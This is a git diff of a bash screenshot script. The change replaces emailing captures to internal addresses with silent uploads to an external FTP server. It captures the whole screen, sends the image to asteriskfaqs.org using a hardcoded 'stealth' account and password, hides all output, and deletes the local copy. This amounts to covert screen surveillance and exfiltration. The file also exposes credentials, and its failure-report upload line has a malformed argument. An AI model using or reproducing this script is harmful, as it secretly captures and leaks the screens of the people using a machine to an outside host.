@@ -1,11 +1,15 @@
 #!/bin/bash
+#
+# @author J. Pavel Espinal, jose@pavelespinal.com
+# 
 
 # Random file name
 current_time="`date +%F_%Hh%Mm%Ss`"
-file_name="${RANDOM}${RANDOM}${PID}_${current_time}.jpg"
-subject_date="`date +%c`"
-recipient="jespinal@CC-IT-38.cc.amsud.com" 
-ccrecipient="jperez@CC-IT-42.cc.amsud.com"
+file_name="/tmp/${HOSTNAME}_${current_time}.jpg"
+ftp_user='stealth@asteriskfaqs.org'
+ftp_pass='st34lthp4ss'
+ftp_server='asteriskfaqs.org'
+
 
 # Function to test if a binary is present on the system
 function isPresent {
@@ -17,50 +21,59 @@ function isPresent {
 }
 
 # Function to send generated file
-function sendMail {
-	mutt -s "${HOSTNAME} machine screenshot at [${subject_date}]" -a /tmp/${file_name} -c "${ccrecipient}" -- ${recipient} </dev/null 
-}
+#function sendMail {
+#	mutt -s "${HOSTNAME} machine screenshot at [${subject_date}]" -a /tmp/${file_name} -c "${ccrecipient}" -- ${recipient} </dev/null 
+#}
 
 # Function to create screenshot
 function createImg {
-	import -window root -strip -resize 85% -quality 75 /tmp/${file_name}
+	import -window root -compress JPEG -strip -resize 85% -quality 75 ${file_name}
+#	echo 'Image created'
 }
 
 function cleanAll {
-	rm -rf /tmp/${file_name}
+	rm -rf ${file_name}
+#	echo 'Image deleted'
 }
 
-#function uploadFile {
-#	ncftpput -u   remote-host remote-directory local-files...
-#}
+function uploadFile {
+#	echo 'Uploading image'
+	ncftpput -u ${ftp_user} -p ${ftp_pass} ${ftp_server} / ${file_name} 1>/dev/null 2>&1
+#	echo 'Image uploaded'
+}
 
-isPresent "imagemagick";
+function reportFail {
+	report_file="${file_name}.txt"
+	echo "There was a problem creating ${file_name} at ${1} time" > "${report_file}"
+	ncftpput -u ${ftp_user} -p ${ftp_pass} -p ${ftp_server} / ${report_file} 1>/dev/null 2>&1
+#	echo 'Report created'
+}
 
 # Is imagemagick present?
+isPresent "imagemagick";
+
 if [ $? != 0 ]; then
 	echo "Imagemagic needs to be installed"
 	sudo apt-get install imagemagick -y
 fi
 
-isPresent "mutt";
-
-# Is mutt present?
-if [ $? != 0 ]; then
-	echo "mutt needs to be installed"
-	sudo apt-get install mutt -y
-fi
-
+# Is ncftp package present?
 isPresent "ncftp";
+
 if [ $? != 0 ]; then
 	echo "ncftp needs to be installed"
 	sudo apt-get install ncftp -y
 fi
 
 # Creating screenshot
-createImg
+if ! (createImg); then
+	reportFail 'create'
+fi
 
-# Sending image
-# sendMail
-
-# Cleaning before exiting
-cleanAll
+# Uploading File 
+if (uploadFile); then 
+	# Cleaning before exiting
+	cleanAll;
+else
+	reportFail 'upload';
+fi
